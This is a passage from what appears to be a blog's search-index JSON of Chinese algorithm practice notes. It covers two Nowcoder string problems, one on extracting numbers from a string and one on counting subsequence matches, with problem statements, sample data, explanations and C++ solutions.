\u4ee3\u7801"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/3.%E7%89%9B%E5%AE%A2%E7%BD%91_NC205084_%E7%89%9B%E7%89%9B%E7%88%B1%E5%AD%97%E7%AC%A6%E4%B8%B2/","text":"\u725b\u5ba2\u7f51 NC205084 \u725b\u725b\u7231\u5b57\u7b26\u4e32 # \u76ee\u5f55 # \u725b\u5ba2\u7f51 NC205084 \u725b\u725b\u7231\u5b57\u7b26\u4e32 \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Time Limit 1.2. Memory Limit 1.3. Problem Description 1.4. Input 1.5. Output 1.6. Sample Input 1.7. Sample Output 1.8. Note 1.9. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801 1. \u9898\u76ee\u63cf\u8ff0 # 1.1. Time Limit # C/C++ 1\u79d2\uff0c\u5176\u4ed6\u8bed\u8a002\u79d2 1.2. Memory Limit # C/C++ 262144K\uff0c\u5176\u4ed6\u8bed\u8a00524288K 1.3. Problem Description # \u725b\u725b\u5728\u73a9\u5b57\u7b26\u4e32\u3002\u725b\u725b\u5f97\u5230\u4e86\u4e00\u4e2a\u5b57\u7b26\u4e32\uff08\u53ef\u80fd\u542b\u6709\u7a7a\u683c\uff09\uff0c\u4ed6\u5e0c\u671b\u5728\u8fd9\u4e9b\u5b57\u7b26\u4e32\u4e2d\u63d0\u53d6\u51fa\u6570\u5b57\u3002\u4f8b\u5982\uff1a a1b23c456d007890 \u4e2d\u53ef\u4ee5\u63d0\u53d6\u51fa 1, 23, 456, 7890 \u51714\u4e2a\u6570\u5b57\u3002\u73b0\u5728\uff0c\u4ed6\u5f97\u5230\u4e86\u4e00\u4e2a\u957f\u5ea6\u9ad8\u8fbe1000\u7684\u5b57\u7b26\u4e32\uff0c\u8bf7\u4f60\u5e2e\u4ed6\u63d0\u53d6\u51fa\u6240\u6709\u7684\u6570\u5b57\u3002 1.4. Input # \u672c\u9898\u6709\u591a\u7ec4\u6570\u636e\u3002\u8f93\u5165\u4e00\u4e2a\u5b57\u7b26\u4e32S\u3002 1.5. Output # \u8f93\u51fa\u63d0\u53d6\u51fa\u7684\u6240\u6709\u6570\u5b57\uff0c\u76f8\u90bb\u4e24\u4e2a\u6570\u5b57\u7528\u4e00\u4e2a\u7a7a\u683c\u9694\u5f00\u3002\u4e0d\u5305\u542b\u6570\u5b57\u7684\u65f6\u5019\u8f93\u51fa\u7a7a\u884c\u6ce8\u610f\uff0c\u4f60\u8f93\u51fa\u7684\u6570\u4e0d\u80fd\u542b\u6709\u524d\u5bfc0\u3002 1.6. Sample Input # u1s1qs 1a2b3c4d5e006d a1b23c456d007890 2333 kur1su alan0233 1.7. Sample Output # 1 1 1 2 3 4 5 6 1 23 456 7890 2333 1 233 1.8. Note # \u6570\u636e\u4fdd\u8bc1 \\sum length(S)\\le 100000 \uff0c\u5b57\u7b26\u4e32\u53ef\u80fd\u542b\u6709\u7a7a\u683c\u3002 1.9. Source # \u725b\u5ba2\u7f51 NC205084 \u725b\u725b\u7231\u5b57\u7b26\u4e32 2. \u89e3\u8bfb # \u4ece\u5b57\u7b26\u4e32\u4e2d\u63d0\u53d6\u6570\u5b57\uff0c\u5e76\u53bb\u9664\u5148\u5bfc0\uff0c\u9700\u8981\u6ce8\u610f\u8fd9\u91cc\u4e0d\u80fd\u7528 while(cin>>str) \uff0c\u56e0\u4e3a\u4f1a\u8df3\u8fc7\u8f93\u5165\u5b57\u7b26\u4e32\u4e2d\u7684\u7a7a\u683c\u3002 \u5355\u72ec\u88ab\u5206\u9694\u7684\u4e00\u4e2a0\uff0c\u5982 e0e \uff0c\u4e5f\u9700\u8981\u8f93\u51fa\uff0c\u8fde\u7eed\u591a\u4e2a0\u7684\u7ec4\u5408\uff0c\u5982 000 \uff0c\u5219\u8f93\u51fa\u6700\u540e\u4e00\u4e2a0\u3002 3. \u4ee3\u7801 # #include<iostream> #include<cstring> using namespace std; int main(){ string str; int flag; while(getline(cin,str)){ flag = 0; for(size_t i = 0; i < str.size(); i++){ // \u4e3a\u6570\u5b57 if(str[i] >= '0' && str[i] <= '9'){ // \u4e3a0\uff0c\u4e14\u4e0d\u4e3a\u6700\u540e\u4e00\u4f4d\uff0c\u524d\u9762\u4e5f\u6ca1\u6709\u975e0\u6570\u5b57 if(str[i] == '0' && flag !=2 && i != str.size() - 1 ){ // \u5148\u5bfc0 flag = 1; }else{ // \u6570\u5b57 flag = 2; cout<<str[i]; } }else{ // \u51680 if(flag == 1)cout<<0; // \u6570\u5b57\u540e\u7684\u7b2c\u4e00\u4e2a\u5b57\u7b26\uff0c\u8f93\u51fa\u7a7a\u683c if(flag != 0)cout<<\" \"; // \u6062\u590d\u72b6\u6001 flag = 0; } } // \u6362\u884c cout<<endl; } } \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3.\u725b\u5ba2\u7f51 NC205084 \u725b\u725b\u7231\u5b57\u7b26\u4e32"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/3.%E7%89%9B%E5%AE%A2%E7%BD%91_NC205084_%E7%89%9B%E7%89%9B%E7%88%B1%E5%AD%97%E7%AC%A6%E4%B8%B2/#nc205084","text":"","title":"\u725b\u5ba2\u7f51 NC205084 \u725b\u725b\u7231\u5b57\u7b26\u4e32"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/3.%E7%89%9B%E5%AE%A2%E7%BD%91_NC205084_%E7%89%9B%E7%89%9B%E7%88%B1%E5%AD%97%E7%AC%A6%E4%B8%B2/#_1","text":"\u725b\u5ba2\u7f51 NC205084 \u725b\u725b\u7231\u5b57\u7b26\u4e32 \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Time Limit 1.2. Memory Limit 1.3. Problem Description 1.4. Input 1.5. Output 1.6. Sample Input 1.7. Sample Output 1.8. Note 1.9. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/3.%E7%89%9B%E5%AE%A2%E7%BD%91_NC205084_%E7%89%9B%E7%89%9B%E7%88%B1%E5%AD%97%E7%AC%A6%E4%B8%B2/#1","text":"","title":"1. \u9898\u76ee\u63cf\u8ff0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/3.%E7%89%9B%E5%AE%A2%E7%BD%91_NC205084_%E7%89%9B%E7%89%9B%E7%88%B1%E5%AD%97%E7%AC%A6%E4%B8%B2/#11-time-limit","text":"C/C++ 1\u79d2\uff0c\u5176\u4ed6\u8bed\u8a002\u79d2","title":"1.1. Time Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/3.%E7%89%9B%E5%AE%A2%E7%BD%91_NC205084_%E7%89%9B%E7%89%9B%E7%88%B1%E5%AD%97%E7%AC%A6%E4%B8%B2/#12-memory-limit","text":"C/C++ 262144K\uff0c\u5176\u4ed6\u8bed\u8a00524288K","title":"1.2. Memory Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/3.%E7%89%9B%E5%AE%A2%E7%BD%91_NC205084_%E7%89%9B%E7%89%9B%E7%88%B1%E5%AD%97%E7%AC%A6%E4%B8%B2/#13-problem-description","text":"\u725b\u725b\u5728\u73a9\u5b57\u7b26\u4e32\u3002\u725b\u725b\u5f97\u5230\u4e86\u4e00\u4e2a\u5b57\u7b26\u4e32\uff08\u53ef\u80fd\u542b\u6709\u7a7a\u683c\uff09\uff0c\u4ed6\u5e0c\u671b\u5728\u8fd9\u4e9b\u5b57\u7b26\u4e32\u4e2d\u63d0\u53d6\u51fa\u6570\u5b57\u3002\u4f8b\u5982\uff1a a1b23c456d007890 \u4e2d\u53ef\u4ee5\u63d0\u53d6\u51fa 1, 23, 456, 7890 \u51714\u4e2a\u6570\u5b57\u3002\u73b0\u5728\uff0c\u4ed6\u5f97\u5230\u4e86\u4e00\u4e2a\u957f\u5ea6\u9ad8\u8fbe1000\u7684\u5b57\u7b26\u4e32\uff0c\u8bf7\u4f60\u5e2e\u4ed6\u63d0\u53d6\u51fa\u6240\u6709\u7684\u6570\u5b57\u3002","title":"1.3. Problem Description"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/3.%E7%89%9B%E5%AE%A2%E7%BD%91_NC205084_%E7%89%9B%E7%89%9B%E7%88%B1%E5%AD%97%E7%AC%A6%E4%B8%B2/#14-input","text":"\u672c\u9898\u6709\u591a\u7ec4\u6570\u636e\u3002\u8f93\u5165\u4e00\u4e2a\u5b57\u7b26\u4e32S\u3002","title":"1.4. Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/3.%E7%89%9B%E5%AE%A2%E7%BD%91_NC205084_%E7%89%9B%E7%89%9B%E7%88%B1%E5%AD%97%E7%AC%A6%E4%B8%B2/#15-output","text":"\u8f93\u51fa\u63d0\u53d6\u51fa\u7684\u6240\u6709\u6570\u5b57\uff0c\u76f8\u90bb\u4e24\u4e2a\u6570\u5b57\u7528\u4e00\u4e2a\u7a7a\u683c\u9694\u5f00\u3002\u4e0d\u5305\u542b\u6570\u5b57\u7684\u65f6\u5019\u8f93\u51fa\u7a7a\u884c\u6ce8\u610f\uff0c\u4f60\u8f93\u51fa\u7684\u6570\u4e0d\u80fd\u542b\u6709\u524d\u5bfc0\u3002","title":"1.5. Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/3.%E7%89%9B%E5%AE%A2%E7%BD%91_NC205084_%E7%89%9B%E7%89%9B%E7%88%B1%E5%AD%97%E7%AC%A6%E4%B8%B2/#16-sample-input","text":"u1s1qs 1a2b3c4d5e006d a1b23c456d007890 2333 kur1su alan0233","title":"1.6. Sample Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/3.%E7%89%9B%E5%AE%A2%E7%BD%91_NC205084_%E7%89%9B%E7%89%9B%E7%88%B1%E5%AD%97%E7%AC%A6%E4%B8%B2/#17-sample-output","text":"1 1 1 2 3 4 5 6 1 23 456 7890 2333 1 233","title":"1.7. Sample Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/3.%E7%89%9B%E5%AE%A2%E7%BD%91_NC205084_%E7%89%9B%E7%89%9B%E7%88%B1%E5%AD%97%E7%AC%A6%E4%B8%B2/#18-note","text":"\u6570\u636e\u4fdd\u8bc1 \\sum length(S)\\le 100000 \uff0c\u5b57\u7b26\u4e32\u53ef\u80fd\u542b\u6709\u7a7a\u683c\u3002","title":"1.8. Note"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/3.%E7%89%9B%E5%AE%A2%E7%BD%91_NC205084_%E7%89%9B%E7%89%9B%E7%88%B1%E5%AD%97%E7%AC%A6%E4%B8%B2/#19-source","text":"\u725b\u5ba2\u7f51 NC205084 \u725b\u725b\u7231\u5b57\u7b26\u4e32","title":"1.9. Source"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/3.%E7%89%9B%E5%AE%A2%E7%BD%91_NC205084_%E7%89%9B%E7%89%9B%E7%88%B1%E5%AD%97%E7%AC%A6%E4%B8%B2/#2","text":"\u4ece\u5b57\u7b26\u4e32\u4e2d\u63d0\u53d6\u6570\u5b57\uff0c\u5e76\u53bb\u9664\u5148\u5bfc0\uff0c\u9700\u8981\u6ce8\u610f\u8fd9\u91cc\u4e0d\u80fd\u7528 while(cin>>str) \uff0c\u56e0\u4e3a\u4f1a\u8df3\u8fc7\u8f93\u5165\u5b57\u7b26\u4e32\u4e2d\u7684\u7a7a\u683c\u3002 \u5355\u72ec\u88ab\u5206\u9694\u7684\u4e00\u4e2a0\uff0c\u5982 e0e \uff0c\u4e5f\u9700\u8981\u8f93\u51fa\uff0c\u8fde\u7eed\u591a\u4e2a0\u7684\u7ec4\u5408\uff0c\u5982 000 \uff0c\u5219\u8f93\u51fa\u6700\u540e\u4e00\u4e2a0\u3002","title":"2. \u89e3\u8bfb"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/3.%E7%89%9B%E5%AE%A2%E7%BD%91_NC205084_%E7%89%9B%E7%89%9B%E7%88%B1%E5%AD%97%E7%AC%A6%E4%B8%B2/#3","text":"#include<iostream> #include<cstring> using namespace std; int main(){ string str; int flag; while(getline(cin,str)){ flag = 0; for(size_t i = 0; i < str.size(); i++){ // \u4e3a\u6570\u5b57 if(str[i] >= '0' && str[i] <= '9'){ // \u4e3a0\uff0c\u4e14\u4e0d\u4e3a\u6700\u540e\u4e00\u4f4d\uff0c\u524d\u9762\u4e5f\u6ca1\u6709\u975e0\u6570\u5b57 if(str[i] == '0' && flag !=2 && i != str.size() - 1 ){ // \u5148\u5bfc0 flag = 1; }else{ // \u6570\u5b57 flag = 2; cout<<str[i]; } }else{ // \u51680 if(flag == 1)cout<<0; // \u6570\u5b57\u540e\u7684\u7b2c\u4e00\u4e2a\u5b57\u7b26\uff0c\u8f93\u51fa\u7a7a\u683c if(flag != 0)cout<<\" \"; // \u6062\u590d\u72b6\u6001 flag = 0; } } // \u6362\u884c cout<<endl; } } \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3. \u4ee3\u7801"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/4.%E7%89%9B%E5%AE%A2%E7%BD%91_NC20859_%E5%85%94%E5%AD%90%E7%9A%84%E5%90%8D%E5%AD%97/","text":"\u725b\u5ba2\u7f51 NC20859 \u5154\u5b50\u7684\u540d\u5b57 # \u76ee\u5f55 # \u725b\u5ba2\u7f51 NC20859 \u5154\u5b50\u7684\u540d\u5b57 \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Title 1.2. Time Limit 1.3. Memory Limit 1.4. Problem Description 1.5. Input 1.6. Output 1.7. Sample Input 1.8. Sample Output 1.9. Note 1.10. Source 2. \u9898\u89e3 3. \u4ee3\u7801 1. \u9898\u76ee\u63cf\u8ff0 # 1.1. Title # \u725b\u5ba2\u7f51 NC20859 \u5154\u5b50\u7684\u540d\u5b57 1.2. Time Limit # C/C++ 1\u79d2\uff0c\u5176\u4ed6\u8bed\u8a002\u79d2 1.3. Memory Limit # C/C++ 131072K\uff0c\u5176\u4ed6\u8bed\u8a00262144K 1.4. Problem Description # \u5154\u5b50\u53d1\u73b0\u5e8f\u5217\u7684\u540d\u5b57\u90fd\u662f\u6570\u5b57\uff0c\u5b9e\u5728\u592a\u65e0\u804a\u4e86\uff0c\u4e8e\u662f\u5154\u5b50\u5f00\u59cb\u7814\u7a76\u5154\u5b50\u7684\u540d\u5b57\u3002 \u73b0\u5728\u5154\u5b50\u624b\u4e0a\u6709 n \u4e2a\u540d\u5b57 Ti \u548c m \u4e2a\u53ef\u7231\u8bcd\u6c47Sj\uff0c\u5154\u5b50\u5bf9\u6bcf\u4e00\u4e2a\u540d\u5b57 Ti \u5b9a\u4e49\u4e86\u4e00\u4e2a\u53ef\u7231\u5ea6\uff0c\u5982\u679c Ti \u4e2d\u51fa\u73b0\u4e86\u4e00\u4e2a\u53ef\u7231\u7684\u5355\u8bcd Sj\uff0c\u90a3\u4e48 Ti \u5c31\u6709 1 \u70b9\u53ef\u7231\u503c\uff0c\u6700\u540e\u7684\u603b\u53ef\u7231\u503c\u5c31\u662f Ti \u7684\u53ef\u7231\u5ea6\uff0c\u8fd9\u91cc\u7684\u51fa\u73b0\u6307 Sj \u662f Ti \u7684\u5b50\u5e8f\u5217\u3002 \u4f8b\u5982 abc \u662f aebdc \u7684\u5b50\u5e8f\u5217\uff0cabc \u4e5f\u662f abcd \u7684\u5b50\u5e8f\u5217\u3002 \u73b0\u5728\u5154\u5b50\u60f3\u77e5\u9053\u6bcf\u4e00\u4e2a\u540d\u5b57\u7684\u53ef\u7231\u5ea6\u3002 1.5. Input # \u7b2c 1 \u884c\u4e24\u4e2a\u6574\u6570 n \u548c m\uff0c\u8868\u793a\u540d\u5b57\u4e2a\u6570\u548c\u53ef\u7231\u8bcd\u6c47\u4e2a\u6570\u3002 \u63a5\u4e0b\u6765 n \u884c\uff0c\u7b2c i \u884c\u662f\u5b57\u7b26\u4e32 Ti \uff0c\u8868\u793a\u5154\u5b50\u624b\u91cc\u7684\u540d\u5b57\u3002 \u518d\u63a5\u4e0b\u6765 m \u884c\uff0c\u6bcf\u884c\u4e00\u4e2a\u5b57\u7b26\u4e32 Sj \uff0c\u8868\u793a\u5154\u5b50\u624b\u91cc\u7684\u53ef\u7231\u8bcd\u6c47\u3002 1.6. Output # \u8f93\u51fa\u5171 n \u884c\uff0c\u6bcf\u884c\u4e00\u4e2a\u6574\u6570\uff0c\u8868\u793a\u6bcf\u4e00\u4e2a\u540d\u5b57\u7684\u53ef\u7231\u5ea6\u3002 1.7. Sample Input # 5 3 Bunny Rabbit TuZi MianZi Sunny uny i a 1.8. Sample Output # 1 2 1 2 1 1.9. Note # \u5bf9\u4e8e 40\\% \u7684\u6570\u636e 1 \\le n \\le 100 \u5bf9\u4e8e 100\\% \u7684\u6570\u636e 1 \\le n \\le 1000\uff0c1 \\le m \\le 100\uff0c1 \\le| T_i |\\le 100\uff0c1 \\le|S_i|\\le 30 |s| \u8868\u793a s \u7684\u957f\u5ea6\u8bf7\u6ce8\u610f\uff0c\u5b57\u7b26\u4e32\u533a\u5206\u5927\u5c0f\u5199\u3002 1.10. Source # \u725b\u5ba2\u7f51 NC20859 \u5154\u5b50\u7684\u540d\u5b57 2. \u9898\u89e3 # \u6bcf\u8bfb\u5165\u4e00\u4e2a\u6a21\u5f0f\u4e32\uff0c\u904d\u5386\u6bcf\u4e2a\u4e3b\u4e32\uff0c\u5bf9\u6bcf\u4e2a\u6a21\u5f0f\u4e32\u4e2d\u7684\u5b57\u6bcd\u8fdb\u884c\u4f9d\u6b21\u5339\u914d\uff0c\u4e0b\u4e00\u6b21\u5339\u914d\u7684\u4f4d\u7f6e\u4ece\u4e0a\u4e00\u6b21\u5339\u914d\u5b8c\u7684\u4f4d\u7f6e\u5f00\u59cb\uff0c\u9632\u6b62\u91cd\u590d\u548c\u4e71\u5e8f\u3002 \u6bcf\u4e2a\u6a21\u5f0f\u4e32\u4e2d\u7684\u5b57\u6bcd\u90fd\u80fd\u5339\u914d\u4e0a\u5219\u5bf9\u5176\u53ef\u7231\u5ea6\u8fdb\u884c\u52a0\u4e00\u3002 3. \u4ee3\u7801 # #include <iostream> using namespace std; const int maxN = 1e3 + 1; string list[maxN], str; int ans[maxN] = { 0 }; bool multiMatch(string str, string pattern) { size_t locBuffer = 0; for (size_t i = 0; i < pattern.size(); i++) { // \u4ece\u4e0a\u4e00\u4e2a\u4f4d\u7f6e\u67e5\u627e locBuffer = str.find(pattern[i], locBuffer); // \u5982\u679c\u6ca1\u6709\u627e\u5230 if (locBuffer == str.npos) { return false; } locBuffer++; } return true; } int main() { int m, n; cin >> n >> m; for (int i = 0; i < n; i++) { cin >> list[i]; } for (int i = 0; i < m; i++) { cin >> str; for (int j = 0; j < n; j++) { // \u53ea\u8981\u4e00\u4f4d\u7279\u5f81\u4e32 if (str.size() == 1) { if (list[j].find(str) != str.npos) ans[j]++; } else { // \u591a\u4f4d if (multiMatch(list[j], str)) ans[j]++; } } } for (int i = 0; i < n; i++) { cout << ans[i] << endl; } } \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"4.\u725b\u5ba2\u7f51 NC20859 \u5154\u5b50\u7684\u540d\u5b57"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/4.%E7%89%9B%E5%AE%A2%E7%BD%91_NC20859_%E5%85%94%E5%AD%90%E7%9A%84%E5%90%8D%E5%AD%97/#nc20859","text":"","title":"\u725b\u5ba2\u7f51 NC20859 \u5154\u5b50\u7684\u540d\u5b57"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/4.%E7%89%9B%E5%AE%A2%E7%BD%91_NC20859_%E5%85%94%E5%AD%90%E7%9A%84%E5%90%8D%E5%AD%97/#_1","text":"\u725b\u5ba2\u7f51 NC20859 \u5154\u5b50\u7684\u540d\u5b57 \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Title 1.2. Time Limit 1.3. Memory Limit 1.4. Problem Description 1.5. Input 1.6. Output 1.7. Sample Input 1.8. Sample Output 1.9. Note 1.10. Source 2. \u9898\u89e3 3. \u4ee3\u7801","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/4.%E7%89%9B%E5%AE%A2%E7%BD%91_NC20859_%E5%85%94%E5%AD%90%E7%9A%84%E5%90%8D%E5%AD%97/#1","text":"","title":"1. \u9898\u76ee\u63cf\u8ff0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/4.%E7%89%9B%E5%AE%A2%E7%BD%91_NC20859_%E5%85%94%E5%AD%90%E7%9A%84%E5%90%8D%E5%AD%97/#11-title","text":"\u725b\u5ba2\u7f51 NC20859 \u5154\u5b50\u7684\u540d\u5b57","title":"1.1. Title"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/4.%E7%89%9B%E5%AE%A2%E7%BD%91_NC20859_%E5%85%94%E5%AD%90%E7%9A%84%E5%90%8D%E5%AD%97/#12-time-limit","text":"C/C++ 1\u79d2\uff0c\u5176\u4ed6\u8bed\u8a002\u79d2","title":"1.2. Time Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/4.%E7%89%9B%E5%AE%A2%E7%BD%91_NC20859_%E5%85%94%E5%AD%90%E7%9A%84%E5%90%8D%E5%AD%97/#13-memory-limit","text":"C/C++ 131072K\uff0c\u5176\u4ed6\u8bed\u8a00262144K","title":"1.3. Memory Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/4.%E7%89%9B%E5%AE%A2%E7%BD%91_NC20859_%E5%85%94%E5%AD%90%E7%9A%84%E5%90%8D%E5%AD%97/#14-problem-description","text":"\u5154\u5b50\u53d1\u73b0\u5e8f\u5217\u7684\u540d\u5b57\u90fd\u662f\u6570\u5b57\uff0c\u5b9e\u5728\u592a\u65e0\u804a\u4e86\uff0c\u4e8e\u662f\u5154\u5b50\u5f00\u59cb\u7814\u7a76\u5154\u5b50\u7684\u540d\u5b57\u3002 \u73b0\u5728\u5154\u5b50\u624b\u4e0a\u6709 n \u4e2a\u540d\u5b57 Ti \u548c m \u4e2a\u53ef\u7231\u8bcd\u6c47Sj\uff0c\u5154\u5b50\u5bf9\u6bcf\u4e00\u4e2a\u540d\u5b57 Ti \u5b9a\u4e49\u4e86\u4e00\u4e2a\u53ef\u7231\u5ea6\uff0c\u5982\u679c Ti \u4e2d\u51fa\u73b0\u4e86\u4e00\u4e2a\u53ef\u7231\u7684\u5355\u8bcd Sj\uff0c\u90a3\u4e48 Ti \u5c31\u6709 1 \u70b9\u53ef\u7231\u503c\uff0c\u6700\u540e\u7684\u603b\u53ef\u7231\u503c\u5c31\u662f Ti \u7684\u53ef\u7231\u5ea6\uff0c\u8fd9\u91cc\u7684\u51fa\u73b0\u6307 Sj \u662f Ti \u7684\u5b50\u5e8f\u5217\u3002 \u4f8b\u5982 abc \u662f aebdc \u7684\u5b50\u5e8f\u5217\uff0cabc \u4e5f\u662f abcd \u7684\u5b50\u5e8f\u5217\u3002 \u73b0\u5728\u5154\u5b50\u60f3\u77e5\u9053\u6bcf\u4e00\u4e2a\u540d\u5b57\u7684\u53ef\u7231\u5ea6\u3002","title":"1.4. Problem Description"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/4.%E7%89%9B%E5%AE%A2%E7%BD%91_NC20859_%E5%85%94%E5%AD%90%E7%9A%84%E5%90%8D%E5%AD%97/#15-input","text":"\u7b2c 1 \u884c\u4e24\u4e2a\u6574\u6570 n \u548c m\uff0c\u8868\u793a\u540d\u5b57\u4e2a\u6570\u548c\u53ef\u7231\u8bcd\u6c47\u4e2a\u6570\u3002 \u63a5\u4e0b\u6765 n \u884c\uff0c\u7b2c i \u884c\u662f\u5b57\u7b26\u4e32 Ti \uff0c\u8868\u793a\u5154\u5b50\u624b\u91cc\u7684\u540d\u5b57\u3002 \u518d\u63a5\u4e0b\u6765 m \u884c\uff0c\u6bcf\u884c\u4e00\u4e2a\u5b57\u7b26\u4e32 Sj 